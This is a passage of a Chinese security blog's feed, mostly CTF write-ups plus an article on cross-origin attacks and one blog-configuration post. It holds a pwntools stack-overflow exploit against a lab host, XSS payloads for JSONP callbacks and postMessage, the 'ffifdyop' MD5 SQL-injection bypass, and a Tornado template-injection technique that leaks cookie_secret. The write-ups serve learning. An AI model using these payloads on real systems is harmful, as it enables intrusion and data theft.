alt></p><p>看到TrueCrypt，立即推要用TrueCrypt。<br>我没有，因此去<a href="https://sourceforge.net/projects/truecrypt/files/TrueCrypt/TrueCrypt-7.2.exe/download">https://sourceforge.net/projects/truecrypt/files/TrueCrypt/TrueCrypt-7.2.exe/download</a> 下一个并且安装。</p><p>然后我们就看一下.pgp，由于目前我们没有获得密钥，所以是无法解密的。</p><p>看到有TrueCrypt，试着用TrueCrypt挂载CISCN2016<br>如果你在第一层，用的是第一行的密码，那么你可以看到<br><img src="/2021/01/28/i%E6%98%A5%E7%A7%8B-Pretty-good-privacy/5.jpg" alt><br>那你能帮帮我吗（？）<br><img src="/2021/01/28/i%E6%98%A5%E7%A7%8B-Pretty-good-privacy/6.jpg" alt></p><p>然而我们老misc选手word可能没有显示隐藏内容吗？使用下面的密码挂载TrueCrypt，即可得到pgp密钥对。<br><img src="/2021/01/28/i%E6%98%A5%E7%A7%8B-Pretty-good-privacy/7.jpg" alt><br>使用pgp加载了两个密钥，即可解密SECRET.docx.pgp<br><img src="/2021/01/28/i%E6%98%A5%E7%A7%8B-Pretty-good-privacy/8.jpg" alt><br><img src="/2021/01/28/i%E6%98%A5%E7%A7%8B-Pretty-good-privacy/9.jpg" alt><br>打开docx，即得flag。<br><img src="/2021/01/28/i%E6%98%A5%E7%A7%8B-Pretty-good-privacy/10.jpg" alt></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;导语&quot;&gt;&lt;a href=&quot;#导语&quot; class=&quot;headerlink&quot; title=&quot;导语&quot;&gt;&lt;/a&gt;导语&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://www.ichunqiu.com/battalion?q=2333&quot;&gt;点击这里去答题&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="ctf" scheme="https://blog.pillar.fun/tags/ctf/"/>
    
    <category term="misc" scheme="https://blog.pillar.fun/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>BUU刷题日记_bjdctf_2020_babystack</title>
    <link href="https://blog.pillar.fun/2021/01/27/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-bjdctf-2020-babystack/"/>
    <id>https://blog.pillar.fun/2021/01/27/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-bjdctf-2020-babystack/</id>
    <published>2021-01-27T09:08:20.000Z</published>
    <updated>2023-02-27T09:52:57.953Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>确实baby stack</p><h1 id="babystack"><a href="#babystack" class="headerlink" title="babystack"></a>babystack</h1><p>先checksec</p><p><img src="/2021/01/27/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-bjdctf-2020-babystack/1677489172635.png" alt="1677489172635"></p><p>拖进IDA</p><p><img src="/2021/01/27/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-bjdctf-2020-babystack/1677489224444.png" alt="1677489224444"></p><p>先输入一个数字，作为nbytes，然后在read nbytes个进buf，没有进行长度检查，硬read。</p><p>还可以看到一个backdoor函数</p><p><img src="/2021/01/27/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-bjdctf-2020-babystack/1677489688250.png" alt="1677489688250"></p><p>于是栈溢出</p><p><img src="/2021/01/27/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-bjdctf-2020-babystack/1677489377210.png" alt="1677489377210"></p><p>虽然上面IDA显示的是buf[12]，但是我们看一眼栈就知道需要用4个db=16字节填满buf，然后一个p64填充ebp，再填backdoor的地址</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:sh.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line">sh=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27836</span>)</span><br><span class="line">payload=<span class="string">&#x27;A&#x27;</span>*<span class="number">16</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x4006e6</span>)</span><br><span class="line">sla(<span class="string">&#x27;name:&#x27;</span>,<span class="string">&#x27;100&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;name?&#x27;</span>,payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2021/01/27/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-bjdctf-2020-babystack/1677490744735.png" alt="1677490744735"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="ctf" scheme="https://blog.pillar.fun/tags/ctf/"/>
    
    <category term="pwn" scheme="https://blog.pillar.fun/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>跨域及安全</title>
    <link href="https://blog.pillar.fun/2021/01/15/%E8%B7%A8%E5%9F%9F%E5%8F%8A%E5%AE%89%E5%85%A8/"/>
    <id>https://blog.pillar.fun/2021/01/15/%E8%B7%A8%E5%9F%9F%E5%8F%8A%E5%AE%89%E5%85%A8/</id>
    <published>2021-01-15T03:46:01.000Z</published>
    <updated>2021-01-18T13:50:26.370Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>由于浏览器最核心、最基本的安全功能——同源策略，的限制，不同源的客户端脚本在没有明确授权的情况下，不能读写对方资源。跨域的问题可以说是前端程序员的一坨心病，与此同时跨域安全也是安全程序员的一大坨心病，今天由我来简单说说~</p><a id="more"></a><h1 id="同源策略是什么"><a href="#同源策略是什么" class="headerlink" title="同源策略是什么"></a>同源策略是什么</h1><p>同源策略是浏览器最核心、最基本的安全功能，是对不同域资源的管理策略。简单来说就是在没有明确授权的情况下，一个源的脚本能且仅能访问自己的源的资源。<br>这里的“资源”主要包括：</p><ol><li>非同源网页的 Cookie、LocalStorage 和 IndexedDB</li><li>非同源网页的 DOM</li><li>非同源地址发送 AJAX 请求浏览器会拒绝响应</li></ol><p>而要想搞明白同源策略，首先要知道怎么样算“同源”：如果两个页面的协议 <strong>协议</strong>、 <strong>域名</strong> 和 <strong>端口</strong> 都相同的话，那么他们就是同源的。<br>举个栗子，针对 <a href="http://smartpillar.xyz">http://smartpillar.xyz</a> 这个页面</p><table><thead><tr><th>URL</th><th>是否同源</th><th align="right">Why？</th></tr></thead><tbody><tr><td><a href="http://smartpillar.xyz/跨域及安全">http://smartpillar.xyz/跨域及安全</a></td><td>是</td><td align="right">协议：http 域名：<a href="http://www.smartpillar.xyz">www.smartpillar.xyz</a> 端口：默认（80）</td></tr><tr><td><a href="https://smartpillar.xyz/分区表">https://smartpillar.xyz/分区表</a></td><td>不是</td><td align="right">协议不同</td></tr><tr><td><a href="http://api.smartpillar.xyz">http://api.smartpillar.xyz</a></td><td>不是</td><td align="right">域名不同</td></tr><tr><td><a href="http://smartpillar.xyz:27016">http://smartpillar.xyz:27016</a></td><td>不是</td><td align="right">端口不同</td></tr></tbody></table><p>比如说你想在smartpillar.xyz的某个接口里读noobgun.club/flag.txt你就不能行</p><p>可以抽象一点：<br>你：浏览器老师，我想借我同桌的橡皮！<br>浏览器：不行，你同桌的橡皮不是你的橡皮！<br>你（心想）：还能难住我？</p><h1 id="怎么应对跨域"><a href="#怎么应对跨域" class="headerlink" title="怎么应对跨域"></a>怎么应对跨域</h1><h2 id="不同源怎么拿cookie"><a href="#不同源怎么拿cookie" class="headerlink" title="不同源怎么拿cookie"></a>不同源怎么拿cookie</h2><p>同源策略认为域和子域属于不同的域，如果两个页面主域相同而次域不同，比如api.smartpillar.xyz和cdn.smartpillar.xyz之间，可以通过设定document.domain为相同的值来共享cookie</p><p>抽象：浏览器老师知道你和你弟是亲戚，并且你和你弟都给老师说你们的橡皮（cookie）的所有者是你们的家族，浏览器老师想想，觉得合理，你和你弟就都可以用橡皮了。</p><h2 id="不同源怎么ajax请求"><a href="#不同源怎么ajax请求" class="headerlink" title="不同源怎么ajax请求"></a>不同源怎么ajax请求</h2><p>同源政策规定，AJAX 请求只能发给同源的网址，否则就报错。<br>因此，一个非常直接的方法就是用代理服务器，通过一些方法设置代理，在请求发送(接收)之前加入中间层，将不同的域转换成相同的，就解决了问题。<br>抽象：你把你的橡皮给浏览器老师，浏览器老师给了中转服务器校长，并且说这个是你的橡皮，校长说，不对，这是XXX的橡皮。老师也就说，好好好，这是XXX的橡皮，然后XXX就可以用你的橡皮了</p><h3 id="jsonp"><a href="#jsonp" class="headerlink" title="jsonp"></a>jsonp</h3><p>跨域对某些资源是没有限制的，比如&lt;script&gt;、&lt;image&gt;、&lt;link&gt;和&lt;iframe&gt;标签<br>jsonp的核心思想就是通过添加一个&lt;script&gt;元素，向服务器请求 JSON 数据，服务器收到请求后，将数据放在一个指定名字的回调函数的参数位置传回来。<br>抽象：老师不让你们传橡皮，但是让你们传衣服，所以你把橡皮塞到衣服里，然后传给了同桌，这样同桌把橡皮从衣服里掏出来就能用了。</p><h3 id="PostMessage"><a href="#PostMessage" class="headerlink" title="PostMessage"></a>PostMessage</h3><p>PostMeaage是H5新引入的实现跨域窗口之间的通讯，可以安全地实现windows对象之间的跨域通信<br>PostMessage主要依靠Window.postMessage方法，该方法有三个参数</p><ol><li>message：发送到其他窗口的数据</li><li>targetOrigin：接受数据消息的目标窗口,当该值为星号（* ）表示任意一个域都可以接受消息</li><li>transfer： 可选项，代表纤细的所有权</li></ol><p>除了发送之外，必然有一个接受消息的窗口，一般用window.addEventListener(“message”,receiveMessage.false),用以接受消息数据<br>他的消息流程如下图<br><img src="/2021/01/15/%E8%B7%A8%E5%9F%9F%E5%8F%8A%E5%AE%89%E5%85%A8/1.jpg" alt><br>抽象：老师不让传橡皮，但是班长规定了一个新的可以传橡皮的方法。</p><h3 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h3><p>CORS 是跨域资源分享（Cross-Origin Resource Sharing）的缩写。它是 W3C 标准，属于跨源 AJAX 请求的根本解决方法。<br>简单来说就是在后端设一个Access-Control-Allow-Origin来确定与哪些域共享资源。如果共享资源包括cookie的话，还需在前端设一个对应的字段来说明。<br>抽象：你早上没写作业，打算问要一本别人的作业抄抄，众所周知，作业不能给别人抄，但是课代表（后端）知道谁谁谁和你关系好，你们经常臭味相投互相抄，于是就给了你一份。</p><h1 id="同源策略存在的安全问题"><a href="#同源策略存在的安全问题" class="headerlink" title="同源策略存在的安全问题"></a>同源策略存在的安全问题</h1><h2 id="jsonp-1"><a href="#jsonp-1" class="headerlink" title="jsonp"></a>jsonp</h2><ol><li><p>对于输入的callback函数名过滤不严格，导致输入的数据直接输出到前端造成XSS<br>直接改函数名字，比如 <code>http://XXXXXXX/index.php?callback=jsonp&lt;img src=x onerror=alert(/xss/)\&gt;</code>就可以反射型XSS了,反射型XSS的危害就不赘述了。</p></li><li><p>JSONP劫持漏洞，由于对于来源域没有严格限制，因此来源于不安全的域的请求也会被响应<br>JSONP劫持，实质上算是一种读类型的CSRF，在恶意的网页中构造恶意的JS代码，当合法用户点击该网页，由于目标站点存在JSONP劫持漏洞的接口，因此会将用户的该接口对应的信息劫持，并将其发送到攻击者的服务器。比如说你与某网站的jsonp接口没有refer头的确认，也就是说这个接口就无脑响应，也就存在了jsonp劫持漏洞。<br>假设你是用户，你先访问了wb，且你和wb有jsonp接口，而wb又没有做好防护，此时，你登陆了wb，同时你又访问了一个坏人的网站，这个网站直接在head里整了一个自动执行的脚本，功能是通过wb的jsonp请求并传数据到他手里，你直接一个个人信息的泄露。</p></li></ol><h2 id="PostMessage-1"><a href="#PostMessage-1" class="headerlink" title="PostMessage"></a>PostMessage</h2><p>PostMessage跨越一般威胁点在于对于目标域限制不严格导致的，大多数开发人员在发送时对于postmessage防范中targetOrigin参数默认为* ，因此只要包含了该方法页面，就能被任何人所接受监听。<br>或者说接受方直接就接收，而不去判断发送方的身份，这样就有可能被别有用心的人发送一些未经授权的消息。<br>而别用用心主要是在接收方设置的读为<code>messageEle.innerHTML</code>方式，这样发送消息的一方就可以发送类似于<code>&lt;img src=&#39;x&#39; onerror=alert(1);&gt;</code>的代码进行XSS。</p><h2 id="CROS"><a href="#CROS" class="headerlink" title="CROS"></a>CROS</h2><p>CORS一般最常见的安全威胁就是CORS错误配置导致资源信息泄漏，与JSONP劫持基本上一致。<br>比如嫌麻烦直接Access-Control-Allow-Origin设为*，然后让有心之人直接构造对应请求就完事了。</p><p>参考：<br><a href="https://blog.csdn.net/qq_38128179/article/details/84956552">https://blog.csdn.net/qq_38128179/article/details/84956552</a><br><a href="https://www.cnblogs.com/dfzj/p/13663301.html">https://www.cnblogs.com/dfzj/p/13663301.html</a><br><a href="https://www.freebuf.com/articles/web/208672.html">https://www.freebuf.com/articles/web/208672.html</a><br><a href="https://www.cnblogs.com/happystudyhuan/p/11583384.html">https://www.cnblogs.com/happystudyhuan/p/11583384.html</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;导语&quot;&gt;&lt;a href=&quot;#导语&quot; class=&quot;headerlink&quot; title=&quot;导语&quot;&gt;&lt;/a&gt;导语&lt;/h1&gt;&lt;p&gt;由于浏览器最核心、最基本的安全功能——同源策略，的限制，不同源的客户端脚本在没有明确授权的情况下，不能读写对方资源。跨域的问题可以说是前端程序员的一坨心病，与此同时跨域安全也是安全程序员的一大坨心病，今天由我来简单说说~&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>BUU刷题日记-Easy_MD5</title>
    <link href="https://blog.pillar.fun/2021/01/13/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-Easy-MD5/"/>
    <id>https://blog.pillar.fun/2021/01/13/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-Easy-MD5/</id>
    <published>2021-01-13T08:23:05.000Z</published>
    <updated>2023-02-27T09:52:51.161Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>something about md5</p><h1 id="Easy-Md5"><a href="#Easy-Md5" class="headerlink" title="Easy-Md5"></a>Easy-Md5</h1><p><img src="/2021/01/13/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-Easy-MD5/1677227184869.png" alt="1677227184869"></p><p>开局一个白框，啥回显也没有。拿burpsuit看看</p><p><img src="/2021/01/13/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-Easy-MD5/1677227335589.png" alt="1677227335589"></p><p>响应头里有提示，经过一番学习，ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是 ‘ or ‘6，而 Mysql 刚好又会吧 hex 转成 ascii 解释</p><p>在mysql中，以数字开头的字符串在转义为boolean时会被看成数字再转义，非零的数字也会被转义是true、</p><p><img src="/2021/01/13/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-Easy-MD5/1677229129892.png" alt="1677229129892"></p><p>所以ffifdyop相当于是一个万能pass</p><p><img src="/2021/01/13/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-Easy-MD5/1677229624624.png" alt="1677229624624"></p><p>根据提示，要让a和b不等，但是让a和b的MD5相等。想到php中数组的md5值都为NULL。</p><p>或者用php的0e绕过，php会把xe……（x为数）开头的一串当做科学计数法，0e表示0*10^……次方，不论……是几，都会被看成0。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="ctf" scheme="https://blog.pillar.fun/tags/ctf/"/>
    
    <category term="web" scheme="https://blog.pillar.fun/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>BUU刷题日记-easy-tornado</title>
    <link href="https://blog.pillar.fun/2021/01/11/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-easy-tornado/"/>
    <id>https://blog.pillar.fun/2021/01/11/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-easy-tornado/</id>
    <published>2021-01-11T08:37:46.000Z</published>
    <updated>2023-01-11T09:39:57.796Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>想要成为web手</p><h1 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy-tornado"></a>easy-tornado</h1><p>看到题目，想到tornado框架</p><p>Tornado是一种 Web 服务器软件的开源版本。Tornado 和主流Web 服务器框架（包括大多数 Python 的框架）有着明显的区别：它是非阻塞式服务器，而且速度相当快。</p><p>打开题目，先看hint</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;hints.txt</span><br><span class="line">md5(cookie_secret+md5(filename))</span><br></pre></td></tr></table></figure><p>看到url是</p><p><a href="http://f2687ed3-88cb-46a0-bb7b-83316462a9d0.node4.buuoj.cn:81/file?filename=/hints.txt&amp;filehash=d3d3cea510582922490a4ede4684b9f6">http://f2687ed3-88cb-46a0-bb7b-83316462a9d0.node4.buuoj.cn:81/file?filename=/hints.txt&amp;filehash=d3d3cea510582922490a4ede4684b9f6</a></p><p>得知请求的时候应该需要带上filehash这个数据，并且filehash是对（cookie_secret+md5(filename)）进行md5得到的，因此我们需要得知cookie_secret的内容，没有提示cookie_secret的信息，因此无法通过暴破手段来获取cookie_secret，思路走到了死胡同，看看别的</p><p>打开flag.txt</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;flag.txt</span><br><span class="line">flag in &#x2F;fllllllllllllag</span><br></pre></td></tr></table></figure><p>可以知道flag在/fllllllllllllag里，尝试访问一下</p><p><img src="/2021/01/11/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-easy-tornado/1673427720813.png" alt="1673427720813"></p><p>带上filehash字段的话（显然filehash不对）</p><p><img src="/2021/01/11/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-easy-tornado/1673427921382.png" alt="1673427921382"></p><p>看到这个msg=Error并且下面显示的也是Error，猜测是有模板注入</p><p>吧Error换一下</p><p><img src="/2021/01/11/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-easy-tornado/1673429844208.png" alt="1673429844208"></p><p>发现确实，所以必有模板注入</p><p>同时welcome.txt</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;welcome.txt</span><br><span class="line">render</span><br></pre></td></tr></table></figure><p>render也是一个提示，render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页 ，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过 <code>&#123;&#123;&#125;&#125;</code>进行传递变量和执行简单的表达式。</p><p>在tornado模板中，存在一些可以访问的快速对象，这里用到的是handler.settings，handler指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，这里面就是我们的一些环境变量</p><p><img src="/2021/01/11/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-easy-tornado/1673428104224.png" alt="1673428104224"></p><p>就获取到了cookie_secret</p><p>那么我们就尝试获取fllllllllllllag所对应的filehash</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"> </span><br><span class="line">file_hash = hashlib.md5()</span><br><span class="line"></span><br><span class="line"><span class="comment"># filename = &#x27;fllllllllllllag&#x27;</span></span><br><span class="line">filename = <span class="string">&#x27;/fllllllllllllag&#x27;</span></span><br><span class="line">file_hash.update(filename.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">s = file_hash.hexdigest()</span><br><span class="line"> </span><br><span class="line">cookie_secret = <span class="string">&quot;4be89441-4141-411b-a28e-17e625898450&quot;</span></span><br><span class="line"> </span><br><span class="line">file_hash = hashlib.md5()</span><br><span class="line">file_hash.update((cookie_secret + s).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"> </span><br><span class="line">print(file_hash.hexdigest())</span><br></pre></td></tr></table></figure><p><img src="/2021/01/11/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-easy-tornado/1673428399158.png" alt="1673428399158"></p><p>得到flag</p><p>参考：</p><p><a href="https://blog.csdn.net/ANYOUZHEN/article/details/124983143">https://blog.csdn.net/ANYOUZHEN/article/details/124983143</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="ctf" scheme="https://blog.pillar.fun/tags/ctf/"/>
    
    <category term="web" scheme="https://blog.pillar.fun/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>给butterfly的valine评论添加emoji</title>
    <link href="https://blog.pillar.fun/2021/01/04/%E7%BB%99butterfly%E7%9A%84valine%E8%AF%84%E8%AE%BA%E6%B7%BB%E5%8A%A0emoji/"/>
    <id>https://blog.pillar.fun/2021/01/04/%E7%BB%99butterfly%E7%9A%84valine%E8%AF%84%E8%AE%BA%E6%B7%BB%E5%8A%A0emoji/</id>
    <published>2021-01-04T04:34:03.000Z</published>
    <updated>2021-03-04T06:20:08.881Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>最近换了butterfly主题，想起之前我的博客都没有什么评论留言系统，于是加了valine评论，一不做二不休，顺便把emoji也加了！</p><h1 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h1><p>主要参考了<a href="https://butterfly.js.org/posts/ceeb73f/">butterfly主题配置文档</a><br>主要需要的就是找一个或者建一个emojiCDN出来，这里我白嫖了<a href="https://github.com/volantis-x/cdn-emoji">https://github.com/volantis-x/cdn-emoji</a><br>因此其实只需要在butterfly的config页面的的emojiCDN添加以下即可，这里我用的贴吧的表情，如果要用其他的也类似。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">valine:</span><br><span class="line">  emojiCDN: &#39;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;volantis-x&#x2F;cdn-emoji&#x2F;tieba&#x2F;&#39;</span><br></pre></td></tr></table></figure><p>然后再去source/_data/valine.json（不论是文件夹还是文件，如果没有就创一个，这是butterfly默认的寻找emojimap的地方）配置好emojimap。我用的贴吧的，可以变成</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;haha&quot;: &quot;haha.png&quot;,</span><br><span class="line">&quot;OK&quot;: &quot;OK.png&quot;,</span><br><span class="line">&quot;what&quot;: &quot;what.png&quot;,</span><br><span class="line">&quot;不高兴&quot;: &quot;不高兴.png&quot;,</span><br><span class="line">&quot;乖&quot;: &quot;乖.png&quot;,</span><br><span class="line">&quot;你懂的&quot;: &quot;你懂的.png&quot;,</span><br><span class="line">&quot;便便&quot;: &quot;便便.png&quot;,</span><br><span class="line">&quot;勉强&quot;: &quot;勉强.png&quot;,</span><br><span class="line">&quot;吐&quot;: &quot;吐.png&quot;,</span><br><span class="line">&quot;吐舌&quot;: &quot;吐舌.png&quot;,</span><br><span class="line">&quot;呀咩爹&quot;: &quot;呀咩爹.png&quot;,</span><br><span class="line">&quot;呵呵&quot;: &quot;呵呵.png&quot;,</span><br><span class="line">&quot;哈哈&quot;: &quot;哈哈.png&quot;,</span><br><span class="line">&quot;啊&quot;: &quot;啊.png&quot;,</span><br><span class="line">&quot;喷&quot;: &quot;喷.png&quot;,</span><br><span class="line">&quot;大拇指&quot;: &quot;大拇指.png&quot;,</span><br><span class="line">&quot;太开心&quot;: &quot;太开心.png&quot;,</span><br><span class="line">&quot;太阳&quot;: &quot;太阳.png&quot;,</span><br><span class="line">&quot;委屈&quot;: &quot;委屈.png&quot;,</span><br><span class="line">&quot;小乖&quot;: &quot;小乖.png&quot;,</span><br><span class="line">&quot;小红脸&quot;: &quot;小红脸.png&quot;,</span><br><span class="line">&quot;彩虹&quot;: &quot;彩虹.png&quot;,</span><br><span class="line">&quot;心碎&quot;: &quot;心碎.png&quot;,</span><br><span class="line">&quot;怒&quot;: &quot;怒.png&quot;,</span><br><span class="line">&quot;惊哭&quot;: &quot;惊哭.png&quot;,</span><br><span class="line">&quot;惊讶&quot;: &quot;惊讶.png&quot;,</span><br><span class="line">&quot;懒得理&quot;: &quot;懒得理.png&quot;,</span><br><span class="line">&quot;手纸&quot;: &quot;手纸.png&quot;,</span><br><span class="line">&quot;挖鼻&quot;: &quot;挖鼻.png&quot;,</span><br><span class="line">&quot;捂嘴笑&quot;: &quot;捂嘴笑.png&quot;,</span><br><span class="line">&quot;星星月亮&quot;: &quot;星星月亮.png&quot;,</span><br><span class="line">&quot;汗&quot;: &quot;汗.png&quot;,</span><br><span class="line">&quot;沙发&quot;: &quot;沙发.png&quot;,</span><br><span class="line">&quot;泪&quot;: &quot;泪.png&quot;,</span><br><span class="line">&quot;滑稽&quot;: &quot;滑稽.png&quot;,</span><br><span class="line">&quot;爱心&quot;: &quot;爱心.png&quot;,</span><br><span class="line">&quot;犀利&quot;: &quot;犀利.png&quot;,</span><br><span class="line">&quot;狂汗&quot;: &quot;狂汗.png&quot;,</span><br><span class="line">&quot;玫瑰&quot;: &quot;玫瑰.png&quot;,</span><br><span class="line">&quot;疑问&quot;: &quot;疑问.png&quot;,</span><br><span class="line">&quot;真棒&quot;: &quot;真棒.png&quot;,</span><br><span class="line">&quot;睡觉&quot;: &quot;睡觉.png&quot;,</span><br><span class="line">&quot;礼物&quot;: &quot;礼物.png&quot;,</span><br><span class="line">&quot;笑尿&quot;: &quot;笑尿.png&quot;,</span><br><span class="line">&quot;笑眼&quot;: &quot;笑眼.png&quot;,</span><br><span class="line">&quot;红领巾&quot;: &quot;红领巾.png&quot;,</span><br><span class="line">&quot;胜利&quot;: &quot;胜利.png&quot;,</span><br><span class="line">&quot;花心&quot;: &quot;花心.png&quot;,</span><br><span class="line">&quot;茶杯&quot;: &quot;茶杯.png&quot;,</span><br><span class="line">&quot;药丸&quot;: &quot;药丸.png&quot;,</span><br><span class="line">&quot;蛋糕&quot;: &quot;蛋糕.png&quot;,</span><br><span class="line">&quot;蜡烛&quot;: &quot;蜡烛.png&quot;,</span><br><span class="line">&quot;鄙视&quot;: &quot;鄙视.png&quot;,</span><br><span class="line">&quot;酷&quot;: &quot;酷.png&quot;,</span><br><span class="line">&quot;酸爽&quot;: &quot;酸爽.png&quot;,</span><br><span class="line">&quot;钱币&quot;: &quot;钱币.png&quot;,</span><br><span class="line">&quot;阴险&quot;: &quot;阴险.png&quot;,</span><br><span class="line">&quot;音乐&quot;: &quot;音乐.png&quot;,</span><br><span class="line">&quot;香蕉&quot;: &quot;香蕉.png&quot;,</span><br><span class="line">&quot;黑线&quot;: &quot;黑线.png&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（捯饬这玩意还花了我点功夫来着）<br>这个emojimap就是 名称：文件的格式，因此也可以直接进行拼接而不设置emojicdn，类似下面这样</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;haha&quot;: &quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;volantis-x&#x2F;cdn-emoji&#x2F;tieba&#x2F;haha.png&quot;</span><br></pre></td></tr></table></figure><p>这样也可以拼起来好几个不同CDN的emoji了，真不错。</p><p>效果就是这样的<br><img src="/2021/01/04/%E7%BB%99butterfly%E7%9A%84valine%E8%AF%84%E8%AE%BA%E6%B7%BB%E5%8A%A0emoji/1.jpg" alt><br>（讲道理在下面好像就能看到了呢）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>BUU刷题日记-千层套路</title>
    <link href="https://blog.pillar.fun/2020/11/02/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-%E5%8D%83%E5%B1%82%E5%A5%97%E8%B7%AF/"/>
    <id>https://blog.pillar.fun/2020/11/02/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-%E5%8D%83%E5%B1%82%E5%A5%97%E8%B7%AF/</id>
    <published>2020-11-02T08:13:07.000Z</published>
    <updated>2022-05-10T09:05:39.591Z</updated>
    
